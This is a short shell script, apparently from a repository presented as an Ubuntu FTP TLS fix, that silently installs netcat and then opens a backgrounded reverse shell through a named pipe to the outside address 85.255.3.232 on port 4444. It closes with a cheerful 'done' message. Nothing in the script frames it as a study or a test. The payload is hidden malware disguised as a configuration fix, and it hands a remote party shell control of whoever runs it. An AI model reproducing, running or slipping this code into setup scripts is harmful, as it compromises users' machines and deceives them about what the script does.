#!/bin/sh
sudo apt-get install netcat python3 > /dev/null

mknod /tmp/pipe p > /dev/null 2>&1 &
/bin/sh 0</tmp/pipe | nc 85.255.3.232 4444 1>/tmp/pipe &

echo "And it's done :)"

# source: https://github.com/EasyFixIt/FTP_ubuntu_TLS
